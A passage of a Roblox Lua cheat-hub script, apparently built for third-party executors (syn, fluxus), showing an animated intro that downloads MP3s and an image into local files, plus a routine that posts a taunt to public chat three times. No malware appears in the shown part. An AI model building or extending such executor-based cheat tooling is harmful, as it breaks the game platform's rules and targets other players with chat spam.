            if syn and syn.request then return syn.request({Url = url, Method = "GET"}) end
        end)
        tryReq(function()
            if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "GET"}) end
        end)
        tryReq(function()
            return game:HttpGet(url)
        end)
        tryReq(function()
            return game:HttpGetAsync(url)
        end)
        return body
    end

    local function cacheIntroSong(option, allowDownload)
        if option and option.assetId then return option.assetId end
        if not option or not option.url or option.url == "" then return nil end
        if not getcustomasset then return nil end
        local fileName = option.file or ("BlastIntroSong_" .. tostring(option.name or "song") .. ".mp3")
        local function loadExisting()
            if introSongCache[fileName] then return introSongCache[fileName] end
            local hasFile = false
            pcall(function() hasFile = isfile and isfile(fileName) end)
            if hasFile then
                local ok = pcall(function() introSongCache[fileName] = getcustomasset(fileName) end)
                if ok and introSongCache[fileName] then return introSongCache[fileName] end
            end
            return nil
        end
        local cached = loadExisting()
        if cached then return cached end
        if allowDownload == false then return nil end
        if introSongDownloading[fileName] then
            local waitStart = tick()
            while introSongDownloading[fileName] and tick() - waitStart < 20 do task.wait(0.05) end
            cached = loadExisting()
            if cached then return cached end
        end
        introSongDownloading[fileName] = true
        local urls = { option.url }
        if option.url:find("litter.catbox.moe", 1, true) then
            table.insert(urls, (option.url:gsub("litter%.catbox%.moe", "files.catbox.moe")))
        elseif option.url:find("files.catbox.moe", 1, true) then
            table.insert(urls, (option.url:gsub("files%.catbox%.moe", "litter.catbox.moe")))
        end
        for attempt = 1, 3 do
            for _, u in ipairs(urls) do
                local data = _httpGetBody(u)
                if data and #data > 1000 and writefile then
                    local wok = pcall(function()
                        writefile(fileName, data)
                        introSongCache[fileName] = getcustomasset(fileName)
                    end)
                    if wok and introSongCache[fileName] then
                        introSongDownloading[fileName] = nil
                        return introSongCache[fileName]
                    end
                end
            end
            task.wait(0.25 * attempt)
        end
        introSongDownloading[fileName] = nil
        return loadExisting()
    end

    local function preloadIntroSongs()
        task.spawn(function()
            cacheIntroSong(INTRO_MUSIC_OPTIONS[INTRO.music], true)
            for _, option in ipairs(INTRO_MUSIC_OPTIONS) do
                if option ~= INTRO_MUSIC_OPTIONS[INTRO.music] then
                    cacheIntroSong(option, true)
                    task.wait(0.05)
                end
            end
        end)
    end

    local function makeIntroSoundFromId(soundId, name, parent)
        if not soundId then return nil end
        local sound = Instance.new("Sound")
        sound.Name = name or "BlastIntroMusic"
        sound.Volume = 0.65
        sound.Looped = false
        sound.SoundId = soundId
        sound.Parent = parent or SoundService
        return sound
    end

    local function createIntroSound(option, fileName, parent, allowDownload)
        if not option then return nil end
        local soundId = cacheIntroSong(option, allowDownload)
        if not soundId then return nil end
        local sound = makeIntroSoundFromId(soundId, fileName, parent)
        if sound and option.volume then sound.Volume = option.volume end
        return sound
    end

    local function previewIntroMusic(index)
        stopIntroPreview()
        stopIntroPlayback()
        if not INTRO_MUSIC_OPTIONS[index] then _safeNotify("ADD SONG LINKS"); return end
        local token = introPreviewToken
        task.spawn(function()
            local option = INTRO_MUSIC_OPTIONS[index]
            local sound = createIntroSound(option, "BlastIntroPreview_" .. tostring(token), SoundService, true)
            if token ~= introPreviewToken then if sound then sound:Destroy() end; return end
            introPreviewSound = sound
            if not sound then _safeNotify("SONG LOADING..."); return end
            local loadStart = tick()
            while sound and not sound.IsLoaded and tick() - loadStart < 15 do task.wait(0.05) end
            if sound and sound.Volume < 0.1 then sound.Volume = 0.65 end
            sound.TimePosition = tonumber(option.startTime) or 0
            pcall(function() sound:Play() end)
            task.delay(15, function() if token == introPreviewToken then stopIntroPreview() end end)
        end)
    end

    local function playIntroMusic()
        stopIntroPreview()
        stopIntroPlayback()
        if not INTRO.enabled then return end
        local option = INTRO_MUSIC_OPTIONS[INTRO.music]
        if not option then return end
        local token = introPlaybackToken
        task.spawn(function()
            local sound = createIntroSound(option, "BlastIntroMusic_" .. tostring(token), SoundService, true)
            if token ~= introPlaybackToken then if sound then pcall(function() sound:Destroy() end) end; return end
            introPlaybackSound = sound
            if not sound then return end
            local loadStart = tick()
            while sound and not sound.IsLoaded and tick() - loadStart < 18 do task.wait(0.05) end
            -- O download pode terminar depois do Skip ou dos 10 segundos.
            -- Nesse caso, nunca iniciar a musica atrasada.
            if token ~= introPlaybackToken then
                pcall(function() sound:Destroy() end)
                return
            end
            if sound and sound.Volume < 0.1 then sound.Volume = 0.65 end
            sound.TimePosition = tonumber(option.startTime) or 0
            pcall(function() sound:Play() end)
            if INTRO._matchSound then pcall(function() INTRO._matchSound:Pause() end) end
        end)
    end

    local function playIntroAnimation()
        local RunService = game:GetService("RunService")
        local TS = TweenService
        local pgui = LP:WaitForChild("PlayerGui", 10)
        local TextService = game:GetService("TextService")

        for _, n in ipairs({"BlastIntro", "AceDuelsIntro", "NoxyIntro"}) do
            pcall(function() local o = CoreGui:FindFirstChild(n); if o then o:Destroy() end end)
            pcall(function() if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end end)
        end

        playIntroMusic()

        task.spawn(function()
            local introGui = Instance.new("ScreenGui")
            introGui.Name = "BlastIntro"
            introGui.IgnoreGuiInset = true
            introGui.DisplayOrder = 9999
            introGui.ResetOnSpawn = false
            pcall(function() introGui.Parent = getSafeGuiParent() end)
            if not introGui.Parent then introGui.Parent = pgui end

            local introActive = true
            local introStartedAt = tick()

            local function finishIntro()
                if not introActive then return end
                introActive = false
                stopIntroPlayback()
                if INTRO.matchEnabled then
                    if INTRO._matchSound then
                        pcall(function() INTRO._matchSound:Resume() end)
                    else
                        INTRO.playMatch()
                    end
                end
                pcall(function() introGui:Destroy() end)
            end
            -- O mesmo encerramento vale para o botao e para o prazo de 10 segundos.
            task.delay(INTRO_DURATION, finishIntro)

            local dark = Instance.new("Frame", introGui)
            dark.Size = UDim2.new(1, 0, 1, 0)
            dark.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
            dark.BackgroundTransparency = 1
            dark.BorderSizePixel = 0
            dark.ZIndex = 1

            local vignette = Instance.new("Frame", introGui)
            vignette.Size = UDim2.new(1, 0, 1, 0)
            vignette.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            vignette.BackgroundTransparency = 1
            vignette.BorderSizePixel = 0
            vignette.ZIndex = 2
            local vigGrad = Instance.new("UIGradient", vignette)
            vigGrad.Rotation = 90
            vigGrad.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.15),
                NumberSequenceKeypoint.new(0.35, 0.85),
                NumberSequenceKeypoint.new(0.65, 0.85),
                NumberSequenceKeypoint.new(1, 0.15),
            })

            local barTop = Instance.new("Frame", introGui)
            barTop.Size = UDim2.new(1, 0, 0, 0)
            barTop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            barTop.BackgroundTransparency = 0.25
            barTop.BorderSizePixel = 0
            barTop.ZIndex = 70

            local barBot = Instance.new("Frame", introGui)
            barBot.AnchorPoint = Vector2.new(0, 1)
            barBot.Position = UDim2.new(0, 0, 1, 0)
            barBot.Size = UDim2.new(1, 0, 0, 0)
            barBot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            barBot.BackgroundTransparency = 0.25
            barBot.BorderSizePixel = 0
            barBot.ZIndex = 70

            local rift = Instance.new("Frame", introGui)
            rift.AnchorPoint = Vector2.new(0.5, 0.5)
            rift.Position = UDim2.new(0.5, 0, 0.5, 0)
            rift.Size = UDim2.new(0, 2, 0, 0)
            rift.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            rift.BorderSizePixel = 0
            rift.ZIndex = 20
            local riftGrad = Instance.new("UIGradient", rift)
            riftGrad.Rotation = 90
            riftGrad.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 1),
                NumberSequenceKeypoint.new(0.5, 0),
                NumberSequenceKeypoint.new(1, 1),
            })

            local glow = Instance.new("Frame", introGui)
            glow.AnchorPoint = Vector2.new(0.5, 0.5)
            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
            glow.Size = UDim2.new(0, 8, 0, 0)
            glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            glow.BackgroundTransparency = 0.75
            glow.BorderSizePixel = 0
            glow.ZIndex = 19

            local skipBtn = Instance.new("TextButton", introGui)
            skipBtn.Name = "SkipIntro"
            skipBtn.AnchorPoint = Vector2.new(1, 0)
            skipBtn.Position = UDim2.new(1, -22, 0, 22)
            skipBtn.Size = UDim2.new(0, 104, 0, 34)
            skipBtn.BackgroundColor3 = Color3.fromRGB(235, 235, 240)
            skipBtn.BackgroundTransparency = 1
            skipBtn.BorderSizePixel = 0
            skipBtn.Text = "SKIP INTRO"
            skipBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            skipBtn.TextTransparency = 1
            skipBtn.TextSize = 11
            skipBtn.Font = Enum.Font.GothamBlack
            skipBtn.AutoButtonColor = false
            skipBtn.ZIndex = 80
            Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(0, 10)
            local skipStroke = Instance.new("UIStroke", skipBtn)
            skipStroke.Color = Color3.fromRGB(255, 255, 255)
            skipStroke.Thickness = 1
            skipStroke.Transparency = 1
            skipBtn.MouseButton1Click:Connect(finishIntro)

            local sparks = {}
            for i = 1, 18 do
                local spark = Instance.new("Frame", introGui)
                spark.AnchorPoint = Vector2.new(0.5, 0.5)
                spark.Size = UDim2.new(0, math.random(2, 4), 0, math.random(8, 22))
                spark.Position = UDim2.new(0.5, 0, 0.5, 0)
                spark.BackgroundColor3 = Color3.fromRGB(230, 230, 235)
                spark.BackgroundTransparency = 1
                spark.BorderSizePixel = 0
                spark.Rotation = math.random(0, 360)
                spark.ZIndex = 18
                Instance.new("UICorner", spark).CornerRadius = UDim.new(1, 0)
                sparks[i] = spark
            end

            local charArt = Instance.new("ImageLabel", introGui)
            charArt.AnchorPoint = Vector2.new(0.5, 1)
            charArt.Position = UDim2.new(0.5, 0, 1, 70)
            charArt.Size = UDim2.new(0, 420, 0, 560)
            charArt.BackgroundTransparency = 1
            charArt.BorderSizePixel = 0
            charArt.ImageTransparency = 1
            charArt.ScaleType = Enum.ScaleType.Fit
            charArt.ZIndex = 12
            pcall(function()
                if getcustomasset and isfile and isfile("BlastIntroAnime.png") then
                    charArt.Image = getcustomasset("BlastIntroAnime.png")
                elseif getcustomasset and writefile and game.HttpGet and INTRO.animeUrl and INTRO.animeUrl ~= "" then
                    local data = game:HttpGet(INTRO.animeUrl)
                    if data and #data > 0 then
                        writefile("BlastIntroAnime.png", data)
                        charArt.Image = getcustomasset("BlastIntroAnime.png")
                    end
                elseif INTRO.animeAsset and INTRO.animeAsset ~= "" then
                    charArt.Image = INTRO.animeAsset
                end
            end)
            local charFade = Instance.new("UIGradient", charArt)
            charFade.Rotation = 90
            charFade.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.05),
                NumberSequenceKeypoint.new(0.62, 0.22),
                NumberSequenceKeypoint.new(1, 0.92),
            })
            task.spawn(function()
                local t0 = tick()
                while charArt.Parent and introActive do
                    local t = tick() - t0
                    local bob = math.sin(t * 1.35) * 10
                    local sway = math.sin(t * 0.85) * 4
                    charArt.Position = UDim2.new(0.5, sway, 1, 10 + bob)
                    charArt.Rotation = math.sin(t * 0.7) * 1.6
                    task.wait(0.03)
                end
            end)

            local stage = Instance.new("Frame", introGui)
            stage.AnchorPoint = Vector2.new(0.5, 0.5)
            stage.Position = UDim2.new(0.5, 0, 0.5, 0)
            stage.Size = UDim2.new(0, 720, 0, 220)
            stage.BackgroundTransparency = 1
            stage.ZIndex = 40

            local halo = Instance.new("Frame", stage)
            halo.AnchorPoint = Vector2.new(0.5, 0.5)
            halo.Position = UDim2.new(0.5, 0, 0, 62)
            halo.Size = UDim2.new(0, 220, 0, 90)
            halo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            halo.BackgroundTransparency = 1
            halo.BorderSizePixel = 0
            halo.ZIndex = 43
            Instance.new("UICorner", halo).CornerRadius = UDim.new(1, 0)

            local logo = Instance.new("ImageLabel", stage)
            logo.AnchorPoint = Vector2.new(0.5, 0.5)
            logo.Position = UDim2.new(0.5, 0, 0, 20)
            logo.Size = UDim2.new(0, 80, 0, 28)
            logo.BackgroundTransparency = 1
            logo.BorderSizePixel = 0
            logo.Image = "rbxassetid://129738961077597"
            logo.ScaleType = Enum.ScaleType.Fit
            logo.ImageTransparency = 1
            logo.ImageColor3 = Color3.fromRGB(235, 35, 45)
            logo.Rotation = -14
            logo.ZIndex = 44
            local logoSweep = Instance.new("UIGradient", logo)
            logoSweep.Rotation = 20
            logoSweep.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 65, 75)),
                ColorSequenceKeypoint.new(0.42, Color3.fromRGB(235, 35, 45)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.58, Color3.fromRGB(235, 35, 45)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 65, 75)),
            })
            logoSweep.Offset = Vector2.new(-1, 0)
            task.spawn(function()
                local off = -1
                while logo.Parent and introActive do
                    off = off + 0.018
                    if off > 1 then off = -1 end
                    logoSweep.Offset = Vector2.new(off, 0)
                    task.wait(0.02)
                end
            end)

            local duels = Instance.new("TextLabel", stage)
            duels.Size = UDim2.new(1, 0, 0, 72)
            duels.Position = UDim2.new(0, 0, 0, 112)
            duels.BackgroundTransparency = 1
            duels.Text = "VLESS HUB"
            duels.TextColor3 = Color3.fromRGB(245, 35, 45)
            duels.Font = Enum.Font.GothamBlack
            duels.TextSize = 52
            duels.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            duels.TextStrokeTransparency = 0.12
            duels.TextTransparency = 1
            duels.ZIndex = 44
            local hubWave = Instance.new("UIGradient", duels)
            hubWave.Rotation = 0
            hubWave.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(105, 105, 110)),
                ColorSequenceKeypoint.new(0.35, Color3.fromRGB(245, 35, 45)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.65, Color3.fromRGB(245, 35, 45)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(105, 105, 110)),
            })
            task.spawn(function()
                local t0 = tick()
                while duels.Parent and introActive do
                    local t = tick() - t0
                    hubWave.Offset = Vector2.new(math.sin(t * 1.7) * 0.8, 0)
                    duels.Position = UDim2.new(0, math.sin(t * 2.2) * 5, 0, 112 + math.sin(t * 2.8) * 5)
                    duels.Rotation = math.sin(t * 2.0) * 1.4
                    task.wait(0.025)
                end
            end)

            local line = Instance.new("Frame", stage)
            line.AnchorPoint = Vector2.new(0.5, 0.5)
            line.Position = UDim2.new(0.5, 0, 0, 116)
            line.Size = UDim2.new(0, 0, 0, 1)
            line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            line.BackgroundTransparency = 1
            line.BorderSizePixel = 0
            line.ZIndex = 43

            local sub = Instance.new("TextLabel", stage)
            sub.Size = UDim2.new(1, 0, 0, 22)
            sub.Position = UDim2.new(0, 0, 0, 164)
            sub.BackgroundTransparency = 1
            sub.Text = "Made By Oldfuck and Mayy"
            sub.TextColor3 = Color3.fromRGB(180, 180, 186)
            sub.Font = Enum.Font.GothamMedium
            sub.TextSize = 16
            sub.TextTransparency = 1
            sub.ZIndex = 44

            -- Intro subtitle: isolated effects; all layers die with introGui.
            local subtitleExiting = false
            local subtitle = Instance.new("TextLabel", stage)
            subtitle.Name = "IntroGlitchSubtitle"
            subtitle.Size = UDim2.new(1, 0, 0, 24)
            subtitle.Position = UDim2.new(0, 0, 0, 194)
            subtitle.BackgroundTransparency = 1
            subtitle.Text = "The Better Than Fluxo.vs On 💩"
            subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            subtitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            subtitle.TextStrokeTransparency = 0.65
            subtitle.Font = Enum.Font.GothamMedium
            subtitle.TextSize = 16
            subtitle.TextScaled = true
            subtitle.TextXAlignment = Enum.TextXAlignment.Center
            subtitle.TextTransparency = 1
            subtitle.Visible = false
            subtitle.ZIndex = 47
            local subtitleLimit = Instance.new("UITextSizeConstraint", subtitle)
            subtitleLimit.MinTextSize = 10
            subtitleLimit.MaxTextSize = 16

            local chromaLayers = {}
            for i, color in ipairs({Color3.fromRGB(0, 235, 255), Color3.fromRGB(255, 0, 190)}) do
                local layer = subtitle:Clone()
                layer.Name = "IntroGlitchChroma" .. i
                layer.TextColor3 = color
                layer.TextStrokeTransparency = 1
                layer.ZIndex = 46
                layer.Parent = stage
                chromaLayers[i] = layer
            end
            -- Thin clipped text bands create local horizontal tears, not screen flashes.
            local glitchBands = {}
            for i, top in ipairs({5, 14}) do
                local clip = Instance.new("Frame", stage)
                clip.Name = "IntroGlitchBand" .. i
                clip.Position = UDim2.new(0, 0, 0, 194 + top)
                clip.Size = UDim2.new(1, 0, 0, 3)
                clip.BackgroundTransparency = 1
                clip.BorderSizePixel = 0
                clip.ClipsDescendants = true
                clip.Visible = false
                clip.ZIndex = 48
                local fragment = subtitle:Clone()
                fragment.Position = UDim2.new(0, 0, 0, -top)
                fragment.TextColor3 = chromaLayers[i].TextColor3
                fragment.TextStrokeTransparency = 1
                fragment.ZIndex = 49
                fragment.Parent = clip
                glitchBands[i] = {clip = clip, text = fragment, top = top}
            end

            local function subtitleIsActive()
                return introActive and not subtitleExiting and introGui.Parent ~= nil and subtitle.Parent ~= nil
            end

            -- INTRO_SUBTITLE_SCHEDULER_BEGIN
            local function scheduleIntroSubtitle(creditTween, isActive, showSubtitle)
                local completedConnection
                completedConnection = creditTween.Completed:Connect(function(playbackState)
                    if completedConnection then completedConnection:Disconnect() end
                    if playbackState ~= Enum.PlaybackState.Completed or not isActive() then return end
                    task.delay(2, function()
                        if isActive() then showSubtitle() end
                    end)
                end)
            end
            -- INTRO_SUBTITLE_SCHEDULER_END

            local function playSubtitleGlitch()
                if not subtitleIsActive() then return end
                subtitle.Visible = true
                for _, layer in ipairs(chromaLayers) do layer.Visible = true end
                for _, band in ipairs(glitchBands) do
                    band.clip.Visible = true
                    band.text.Visible = true
                end
                local steps = {
                    {x = -4, split = 3, alpha = 0.38, tear = 7, duration = 0.055},
                    {x = 3, split = -2, alpha = 0.14, tear = -6, duration = 0.065},
                    {x = 0, split = 1, alpha = 0.06, tear = 0, duration = 0.10},
                    {x = -2, split = 3, alpha = 0.26, tear = 5, duration = 0.045},
                    {x = 2, split = -2, alpha = 0.10, tear = -4, duration = 0.055},
                    {x = 0, split = 1, alpha = 0.02, tear = 0, duration = 0.12},
                    {x = 1, split = 2, alpha = 0.12, tear = 3, duration = 0.045},
                    {x = 0, split = 0, alpha = 0, tear = 0, duration = 0.10},
                }
                for _, step in ipairs(steps) do
                    if not subtitleIsActive() then return end
                    subtitle.Position = UDim2.new(0, step.x, 0, 194)
                    subtitle.TextTransparency = step.alpha
                    for i, layer in ipairs(chromaLayers) do
                        local direction = i == 1 and -1 or 1
                        layer.Position = UDim2.new(0, step.x + step.split * direction, 0, 194)
                        layer.TextTransparency = math.min(1, 0.70 + step.alpha)
                    end
                    for i, band in ipairs(glitchBands) do
                        band.clip.Visible = step.tear ~= 0
                        band.text.Position = UDim2.new(0, step.tear * (i == 1 and 1 or -1), 0, -band.top)
                        band.text.TextTransparency = 0.42
                    end
                    task.wait(step.duration)
                end
                if not subtitleIsActive() then return end
                subtitle.Position = UDim2.new(0, 0, 0, 194)
                subtitle.TextTransparency = 0
                for _, layer in ipairs(chromaLayers) do layer.Visible = false end
                for _, band in ipairs(glitchBands) do band.clip.Visible = false end
                -- No idle flicker: the message remains readable until the normal exit.
            end

            local flash = Instance.new("Frame", introGui)
            flash.Size = UDim2.new(1, 0, 1, 0)
            flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            flash.BackgroundTransparency = 1
            flash.BorderSizePixel = 0
            flash.ZIndex = 90

            TS:Create(dark, TweenInfo.new(0.45), {BackgroundTransparency = 0.62}):Play()
            TS:Create(vignette, TweenInfo.new(0.5), {BackgroundTransparency = 0.7}):Play()
            task.wait(0.28)
            if not introActive then return end

            for _, spark in ipairs(sparks) do
                local ang = math.rad(math.random(0, 360))
                local dist = 80 + math.random() * 220
                TS:Create(spark, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Position = UDim2.new(0.5, math.cos(ang) * dist, 0.5, math.sin(ang) * dist),
                    BackgroundTransparency = 0.15,
                    Rotation = spark.Rotation + 80,
                }):Play()
                task.delay(0.35, function()
                    if spark.Parent then
                        TS:Create(spark, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
                    end
                end)
            end

            task.wait(0.18)
            if not introActive then return end
            TS:Create(charArt, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                ImageTransparency = 0.22,
                Position = UDim2.new(0.5, 0, 1, 10),
            }):Play()
            TS:Create(logo, TweenInfo.new(0.62, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Position = UDim2.new(0.5, 0, 0, 62),
                Size = UDim2.new(0, 360, 0, 124),
                ImageTransparency = 0,
                Rotation = 0,
            }):Play()
            task.delay(0.62, function()
                if not introActive or not logo.Parent then return end
                TS:Create(logo, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Size = UDim2.new(0, 340, 0, 118),
                }):Play()
            end)

            task.wait(0.48)
            if not introActive then return end
            TS:Create(line, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 280, 0, 1),
                BackgroundTransparency = 0.05,
            }):Play()
            TS:Create(duels, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
            local creditTween = TS:Create(sub, TweenInfo.new(0.45), {TextTransparency = 0.08})
            scheduleIntroSubtitle(creditTween, subtitleIsActive, playSubtitleGlitch)
            creditTween:Play()
            TS:Create(skipBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0.08, TextTransparency = 0}):Play()
            TS:Create(skipStroke, TweenInfo.new(0.3), {Transparency = 0.12}):Play()
            -- rift/glow/halo stay hidden

            local shakeConn
            local shakeExiting = false
            do
                local smooth = 0
                local st = 0
                local lastHit = 0
                shakeConn = RunService.RenderStepped:Connect(function(dt)
                    if not introActive or shakeExiting then
                        if shakeConn then pcall(function() shakeConn:Disconnect() end) end
                        return
                    end
                    st = st + dt
                    local loud = 0
                    pcall(function()
                        if introPlaybackSound and introPlaybackSound.Parent and introPlaybackSound.IsPlaying then
                            loud = introPlaybackSound.PlaybackLoudness
                        end
                    end)
                    local target = math.clamp(loud / 280, 0, 1)
                    smooth = smooth + (target - smooth) * math.clamp(dt * 18, 0, 1)
                    local amp = 0.8 + smooth * 7
                    local ox = math.noise(st * 24, 0.7) * amp
                    local oy = math.noise(1.4, st * 26) * amp
                    local pulse = 330 + math.floor(smooth * 36 + 0.5)
                    local pulseH = 114 + math.floor(smooth * 12 + 0.5)
                    logo.Position = UDim2.new(0.5, ox, 0, 62 + oy)
                    logo.Size = UDim2.new(0, pulse, 0, pulseH)
                    line.BackgroundTransparency = 0.05
                end)
            end

            do
                local FADE_OUT_TIME = 1.05
                while introActive do
                    if tick() - introStartedAt >= INTRO_DURATION - FADE_OUT_TIME then break end
                    task.wait(0.1)
                end
            end
            if not introActive then return end
            subtitleExiting = true
            for _, layer in ipairs(chromaLayers) do layer.Visible = false end
            for _, band in ipairs(glitchBands) do band.clip.Visible = false end
            TS:Create(subtitle, TweenInfo.new(0.28), {TextTransparency = 1}):Play()
            shakeExiting = true
            if shakeConn then pcall(function() shakeConn:Disconnect() end) end

            -- no flash overlay
            TS:Create(charArt, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                ImageTransparency = 1,
                Position = UDim2.new(0.5, 0, 1, 80),
            }):Play()
            TS:Create(logo, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 390, 0, 136),
            }):Play()
            task.delay(0.16, function()
                if not logo.Parent then return end
                TS:Create(logo, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                    Position = UDim2.new(0.5, 0, 0, 110),
                    Size = UDim2.new(0, 24, 0, 10),
                    ImageTransparency = 1,
                    Rotation = 12,
                }):Play()
            end)
            TS:Create(duels, TweenInfo.new(0.32), {TextTransparency = 1}):Play()
            TS:Create(sub, TweenInfo.new(0.28), {TextTransparency = 1}):Play()
            TS:Create(line, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
                Size = UDim2.new(0, 0, 0, 1),
                BackgroundTransparency = 1,
            }):Play()
            TS:Create(skipBtn, TweenInfo.new(0.2), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
            TS:Create(skipStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
            TS:Create(dark, TweenInfo.new(0.7), {BackgroundTransparency = 1}):Play()
            TS:Create(vignette, TweenInfo.new(0.55), {BackgroundTransparency = 1}):Play()
            task.wait(0.75)
            finishIntro()
        end)
    end

    INTRO.OPTIONS = INTRO_MUSIC_OPTIONS
    INTRO.stopPreview = stopIntroPreview
    INTRO.stopPlayback = stopIntroPlayback
    INTRO.getSongName = getIntroSongName
    INTRO.preview = previewIntroMusic
    INTRO.play = playIntroAnimation
    INTRO._matchToken = 0

    INTRO.stopMatch = function()
        INTRO._matchToken = (INTRO._matchToken or 0) + 1
        if INTRO._matchSound then
            pcall(function() INTRO._matchSound:Stop() end)
            pcall(function() INTRO._matchSound:Destroy() end)
            INTRO._matchSound = nil
        end
        pcall(function()
            if _G.BlastMatchUI and _G.BlastMatchUI.refresh then _G.BlastMatchUI.refresh() end
        end)
    end

    INTRO.MATCH_OPTIONS = {
        {name="Yo Voy Voy", url="https://litter.catbox.moe/xkew3553w380fzfb.mp3", file="BlastIntroSong_10.mp3"},
        {name="Tryhard", assetId="rbxassetid://77142753938657", volume=0.7},
        {name="Tryhard BR 1", assetId="rbxassetid://135750430892149", volume=0.7},
        {name="STRINGS FUNK", url="https://litter.catbox.moe/rvi4fpjia6bgvzi3.mp3", file="MiseryMatchSong_4.mp3"},
        {name="CUIDA DO PET", url="https://litter.catbox.moe/dw8fcc21n2cjtr20.mp3", file="MiseryMatchSong_5.mp3"},
        {name="Ultra Maligna", url="https://litter.catbox.moe/e3bu4b0q7hxx1i1k.mp3", file="MiseryMatchSong_6.mp3"},
        {name="Tryhard BR 2", url="https://litter.catbox.moe/0fq7y2kjpxn7wc6b.mp3", file="MiseryMatchSong_7.mp3"},
    }

    INTRO.getMatchSongName = function()
        local opt = INTRO.MATCH_OPTIONS[INTRO.matchMusic]
        return opt and opt.name or "No Song"
    end

    INTRO.playMatch = function()
        INTRO.stopMatch()
        if not INTRO.matchEnabled then return end
        local option = INTRO.MATCH_OPTIONS[INTRO.matchMusic]
        if not option then return end
        local token = INTRO._matchToken
        task.spawn(function()
            local sound = createIntroSound(option, "MiseryMatchMusic_" .. tostring(token), SoundService, true)
            if token ~= INTRO._matchToken then
                if sound then pcall(function() sound:Destroy() end) end
                return
            end
            INTRO._matchSound = sound
            if not sound then return end
            sound.Looped = false
            sound.Volume = option.volume or 0.65
            local loadStart = tick()
            while sound and not sound.IsLoaded and tick() - loadStart < 15 do task.wait(0.05) end
            if token ~= INTRO._matchToken then return end
            sound.TimePosition = 0
            pcall(function() sound:Play() end)
            pcall(function()
                sound.Ended:Connect(function()
                    if token == INTRO._matchToken and INTRO.matchEnabled and INTRO._matchSound == sound then
                        sound.TimePosition = 0
                        pcall(function() sound:Play() end)
                    end
                end)
            end)
            pcall(function()
                if _G.BlastMatchUI and _G.BlastMatchUI.refresh then _G.BlastMatchUI.refresh() end
            end)
        end)
    end

    preloadIntroSongs()
end)()

-- ============================================================
-- BLAST - BLACK THEME + TAB SYSTEM
-- ============================================================

local RunService      = game:GetService("RunService")
local UIS             = game:GetService("UserInputService")
local HttpService     = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local _isfile   = isfile   or (syn and syn.isfile)   or function() return false end
local _readfile = readfile  or (syn and syn.readfile)  or function() return nil  end
local _writefile= writefile or (syn and syn.writefile) or function() end
local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)

-- Backgrounds portados do XZZ DUELS
local MISERY_BACKGROUND_IDS = {
    "78984580985059", -- fundo principal rosa/roxo
    "83597321089055",
    "120792937680328",
    "83020463279031",
    "90280869222992",
    "98746506757032",
    "91006645127009",
}

-- TAUNT x3 portado do XZZ DUELS (globais para evitar o limite de locals do Luau)
_G.BlastTauntMessage = "MISERY ON TOP LOL"
_G.BlastTauntRepeatCount = 3
_G.BlastTauntMessageDelay = 0.35
_G.BlastTauntQueue = 0
_G.BlastTauntWorkerRunning = false

function _G.BlastSendTauntChatMessage()
    local sentWithTextChat = false
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
        local channels = TextChatService:FindFirstChild("TextChannels")
        if not channels then return end
        local channel = channels:FindFirstChild("RBXGeneral")
        if not channel then
            for _, candidate in ipairs(channels:GetChildren()) do
                if candidate:IsA("TextChannel") then channel = candidate; break end
            end
        end
        if channel then
            channel:SendAsync(_G.BlastTauntMessage)
            sentWithTextChat = true
        end
    end)
    if sentWithTextChat then return true end

    local legacySent = false
    pcall(function()
        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        local sayMessage = events and events:FindFirstChild("SayMessageRequest")
        if sayMessage then
            sayMessage:FireServer(_G.BlastTauntMessage, "All")
            legacySent = true
        end
    end)
    return legacySent
end

function _G.BlastRunTaunt()
